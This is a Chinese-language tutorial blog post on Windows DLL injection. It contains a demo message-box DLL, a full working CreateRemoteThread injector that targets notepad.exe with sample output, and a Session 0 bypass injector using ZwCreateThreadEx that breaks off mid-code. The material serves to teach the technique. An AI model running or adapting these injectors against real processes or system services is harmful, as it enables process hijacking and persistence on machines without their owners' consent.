        <content type="html"><![CDATA[<span id="more"></span><h1 id="Windows-DLL-注入和Api-Hook"><a href="#Windows-DLL-注入和Api-Hook" class="headerlink" title="Windows DLL 注入和Api Hook"></a>Windows DLL 注入和Api Hook</h1><h2 id="DLL-注入"><a href="#DLL-注入" class="headerlink" title="DLL 注入"></a>DLL 注入</h2><p>DLL 注入（DLL Injection）是指将一个外部的动态链接库（DLL）强制加载到目标进程的虚拟地址空间中，并使其代码在目标进程的上下文中执行的技术。</p><p><strong>核心原理：</strong><br>Windows 操作系统对进程实施了<strong>虚拟内存隔离</strong>机制，进程 A 无法直接访问进程 B 的内存。DLL 注入的本质是打破这种隔离，通过操作系统提供的调试 API 或机制，在目标进程的内存中写入恶意 DLL 的路径，并操纵目标进程的主动加载行为（通常是强制调用 <code>LoadLibrary</code> API），从而使恶意 DLL 成为目标进程的一部分。</p><p>一旦注入成功，DLL 将拥有与目标进程相同的权限（Process Token），能够访问其内存数据、挂钩 API 或作为跳板进行持久化攻击。</p><p><code>MessageBoxDll.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUN_SUCESS 0</span></span><br><span class="line">__declspec(dllexport) <span class="type">int</span> __cdecl <span class="title function_">DownLoadFileFromUrl</span><span class="params">(<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;Start Exploooosion&quot;</span>), TEXT(<span class="string">&quot;Hacked&quot;</span>), MB_OK);</span><br><span class="line">          <span class="keyword">return</span> RUN_SUCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(i==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;Stop Exploooosion&quot;</span>), TEXT(<span class="string">&quot;Hacked&quot;</span>), MB_OK);</span><br><span class="line">          <span class="keyword">return</span> RUN_SUCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (fdwReason)</span><br><span class="line">  &#123; </span><br><span class="line">    <span class="comment">// 将dll文件附加到进程（加载到地址空间时）。</span></span><br><span class="line">      <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">          DownLoadFileFromUrl(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 在进程中创建了新线程之后会执行。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 进程中的线程退出时，执行的函数。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">// 当dll从进程空间脱离（退出）时执行的进程。</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        DownLoadFileFromUrl(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="经典远程线程注入-Classic-CreateRemoteThread"><a href="#经典远程线程注入-Classic-CreateRemoteThread" class="headerlink" title="经典远程线程注入 (Classic CreateRemoteThread)"></a>经典远程线程注入 (Classic CreateRemoteThread)</h3><p>这是最基础也是最通用的注入方式，旨在向普通用户进程注入 DLL。</p><h4 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h4><p>攻击者进程在目标进程中开辟内存，写入 DLL 路径，然后“远程”命令目标进程创建一个新线程。这个新线程的唯一任务就是执行 <code>LoadLibrary</code> 函数，从而加载指定的 DLL。</p><h4 id="实现方法与流程-参考-classicdllinjection-c"><a href="#实现方法与流程-参考-classicdllinjection-c" class="headerlink" title="实现方法与流程 (参考 classicdllinjection.c)"></a>实现方法与流程 (参考 <code>classicdllinjection.c</code>)</h4><ol><li><strong>获取权限</strong> ：获取目标进程句柄。</li><li><strong>分配内存</strong> ：在目标进程空间中申请一块内存。</li><li><strong>写入数据</strong> ：将 DLL 的完整路径写入刚才申请的内存。</li><li><strong>地址解析</strong> ：计算 <code>LoadLibraryW</code> 函数在内存中的地址（通常利用 Kernel32.dll 在所有进程中基址相同的特性，或使用 PEB Walking 技术）。</li><li><strong>执行注入</strong> ：创建远程线程调用 <code>LoadLibraryW</code>。</li></ol><h4 id="1-3-核心-API-及作用"><a href="#1-3-核心-API-及作用" class="headerlink" title="1.3 核心 API 及作用"></a>1.3 核心 API 及作用</h4><ul><li><code>OpenProcess(PROCESS_ALL_ACCESS, ...)</code>：获取目标进程的操作句柄，需要足够的权限（如 <code>VM_WRITE</code>, <code>VM_OPERATION</code>）。</li><li><code>VirtualAllocEx(...)</code>： <strong>关键步骤</strong> 。在<strong>目标进程</strong>的内存空间中分配内存，用于存放 DLL 路径字符串。</li><li><code>WriteProcessMemory(...)</code>：将本地的 DLL 路径字符串复制到目标进程刚才分配的内存中。</li><li><code>GetRemoteModuleHandle</code> &#x2F; <code>GetProcAddress</code>：获取 <code>LoadLibrary</code> 函数的地址。在你的代码中，使用了更高级的 PEB Walking 技术来查找模块基址。</li><li><code>CreateRemoteThread(...)</code>： <strong>核心触发点</strong> 。在目标进程中创建一个新线程，线程的入口点设为 <code>LoadLibrary</code>，参数设为 DLL 路径的内存地址。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 DLL 注入的核心逻辑</span></span><br><span class="line">BOOL <span class="title function_">InjectDLL</span><span class="params">(DWORD pid, <span class="type">wchar_t</span>* dllPath)</span> &#123;</span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> pathLen = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    <span class="comment">// 1. 在目标进程分配内存</span></span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathLen, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, dllPath, pathLen, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. PEB Walking 获取 Kernel32 基址 (调用 injector.h 中的函数)</span></span><br><span class="line">    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, <span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hRemoteKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find kernel32.dll in target process via PEB.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found Remote Kernel32 Base: 0x%p\n&quot;</span>, (<span class="type">void</span>*)hRemoteKernel32);</span><br><span class="line">    <span class="comment">// 4. 计算 LoadLibraryW 的远程地址</span></span><br><span class="line">    HMODULE hLocalKernel32 = GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="comment">// 偏移量计算</span></span><br><span class="line">    <span class="type">uintptr_t</span> offset = (<span class="type">uintptr_t</span>)pLocalLoadLibrary - (<span class="type">uintptr_t</span>)hLocalKernel32;</span><br><span class="line">    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((<span class="type">uintptr_t</span>)hRemoteKernel32 + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Calculated Remote LoadLibraryA: 0x%p\n&quot;</span>, pRemoteLoadLibrary);</span><br><span class="line">    <span class="comment">// 5. 创建远程线程</span></span><br><span class="line">    HANDLE hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pRemoteLoadLibrary, pRemoteMem, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] CreateRemoteThread failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Remote thread created. Waiting for execution...\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 1. 等待线程结束 (即 LoadLibrary 执行完毕)</span></span><br><span class="line">        WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">        <span class="comment">// 2. 获取线程退出码 (这就是 LoadLibrary 的返回值)</span></span><br><span class="line">        DWORD exitCode = <span class="number">0</span>;</span><br><span class="line">        GetExitCodeThread(hThread, &amp;exitCode);</span><br><span class="line">        <span class="keyword">if</span> (exitCode == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection FAILED. LoadLibrary returned NULL.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    Possible causes:\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    1. DLL path is incorrect (Target process can&#x27;t find it).\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    2. Architecture mismatch (Injecting 32-bit DLL into 64-bit Process).\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;    3. Dependency missing.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection SUCCESS. Remote DLL Handle: 0x%lX\n&quot;</span>, exitCode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;[+] Remote thread created successfully.\n&quot;);</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="comment">// 使用 GetFullPathNameW</span></span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDll.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用 injector.h 中的函数</span></span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Process not found. Make sure it is running.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Target PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Attempting injection via PEB walking (Compact Version)...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (InjectDLL(pid, dllPath)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Injection sequence completed successfully.\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Injection failed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-4-攻击效果"><a href="#1-4-攻击效果" class="headerlink" title="1.4 攻击效果"></a>1.4 攻击效果</h4><ul><li><strong>效果</strong> ：能够控制任何当前用户权限下的普通进程（如 Notepad, Chrome）。</li><li><strong>局限</strong> ：在 Windows Vista 以后，由于 Session 0 隔离机制，无法使用此 API 向系统服务注入。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Exploooosion\Desktop&gt; .\Project4.exe                                                                        [+] Target PID: 9204                                                                                                    [*] Attempting injection via PEB walking (Compact Version)...                                                           [+] Found Remote Kernel32 Base: 0x00007FF8AABC0000                                                                      [+] Calculated Remote LoadLibraryA: 0x00007FF8AABE0220                                                                  [+] Remote thread created. Waiting for execution...                                                                     [+] Injection SUCCESS. Remote DLL Handle: 0x64780000                                                                    [+] Injection sequence completed successfully.  </span><br></pre></td></tr></table></figure><p><img src="/image/2025-12-12-windows_dll_injection/1765524982009.png" alt="1765524982009"></p><h3 id="突破-Session-0-隔离注入-Session-0-Bypass"><a href="#突破-Session-0-隔离注入-Session-0-Bypass" class="headerlink" title="突破 Session 0 隔离注入 (Session 0 Bypass)"></a>突破 Session 0 隔离注入 (Session 0 Bypass)</h3><p>针对系统服务和高权限进程的注入技术。</p><h4 id="技术原理-1"><a href="#技术原理-1" class="headerlink" title="技术原理"></a>技术原理</h4><p>Windows 将服务和系统核心进程运行在 Session 0，而用户进程运行在 Session 1+。<code>CreateRemoteThread</code> 在跨 Session 操作时会失败。此技术通过调用底层的 Native API (<code>ZwCreateThreadEx</code>) 直接与内核交互，绕过 Win32 子系统的 Session 检查。</p><h4 id="实现方法与流程-参考-session0bypass-c"><a href="#实现方法与流程-参考-session0bypass-c" class="headerlink" title="实现方法与流程 (参考 session0bypass.c)"></a>实现方法与流程 (参考 <code>session0bypass.c</code>)</h4><p>流程的前半部分（打开进程、分配内存、写入路径）与经典注入完全一致。唯一的区别在于最后一步“创建线程”的方式。</p><h4 id="核心-API-及作用"><a href="#核心-API-及作用" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul><li><code>OpenProcess</code> &#x2F; <code>VirtualAllocEx</code> &#x2F; <code>WriteProcessMemory</code>：作用同上。</li><li><code>GetModuleHandle(&quot;ntdll.dll&quot;)</code> &amp; <code>GetProcAddress</code>：获取 <code>ntdll.dll</code> 中的未文档化函数地址。</li><li><code>ZwCreateThreadEx(...)</code>： <strong>核心触发点</strong> 。这是一个内核级 API，比 <code>CreateRemoteThread</code> 更底层。它允许在特定的标志位设置下，忽略 Session 隔离限制，在 Session 0 的进程（如 <code>spoolsv.exe</code>, <code>svchost.exe</code>）中创建线程。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行 DLL 注入的核心逻辑</span></span><br><span class="line">BOOL <span class="title function_">InjectDLL</span><span class="params">(DWORD pid, <span class="type">const</span> <span class="type">wchar_t</span>* dllPath)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取目标进程句柄</span></span><br><span class="line">    <span class="comment">// 注意：操作 Session 0 服务进程通常需要 SeDebugPrivilege</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> pathLen = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    <span class="comment">// 2. 在目标进程分配内存</span></span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathLen, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathLen, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. PEB Walking 获取 Kernel32 基址</span></span><br><span class="line">    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(hProcess, <span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hRemoteKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find kernel32.dll in target process via PEB.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found Remote Kernel32 Base: 0x%p\n&quot;</span>, (<span class="type">void</span>*)hRemoteKernel32);</span><br><span class="line">    <span class="comment">// 5. 计算 LoadLibraryW 的远程地址</span></span><br><span class="line">    HMODULE hLocalKernel32 = GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    FARPROC pLocalLoadLibrary = GetProcAddress(hLocalKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="type">uintptr_t</span> offset = (<span class="type">uintptr_t</span>)pLocalLoadLibrary - (<span class="type">uintptr_t</span>)hLocalKernel32;</span><br><span class="line">    LPTHREAD_START_ROUTINE pRemoteLoadLibrary = (LPTHREAD_START_ROUTINE)((<span class="type">uintptr_t</span>)hRemoteKernel32 + offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Calculated Remote LoadLibraryW: 0x%p\n&quot;</span>, pRemoteLoadLibrary);</span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    <span class="comment">//         使用 ZwCreateThreadEx 绕过 Session 0 隔离</span></span><br><span class="line">    <span class="comment">// ============================================================</span></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hNtdll = GetModuleHandleW(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hNtdll) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load ntdll.dll\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取 ZwCreateThreadEx 地址</span></span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!ZwCreateThreadEx) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] GetProcAddress for ZwCreateThreadEx failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Calling ZwCreateThreadEx to bypass Session 0 isolation...\n&quot;</span>);</span><br><span class="line">    DWORD status = ZwCreateThreadEx(</span><br><span class="line">        &amp;hThread, </span><br><span class="line">        PROCESS_ALL_ACCESS, </span><br><span class="line">        <span class="literal">NULL</span>, </span><br><span class="line">        hProcess, </span><br><span class="line">        pRemoteLoadLibrary, </span><br><span class="line">        pRemoteMem, </span><br><span class="line">        <span class="number">0</span>, <span class="comment">// Flags / CreateSuspended = 0</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123; <span class="comment">// 0 表示 STATUS_SUCCESS</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] ZwCreateThreadEx failed. Status: 0x%lx\n&quot;</span>, status);</span><br><span class="line">        VirtualFreeEx(hProcess, 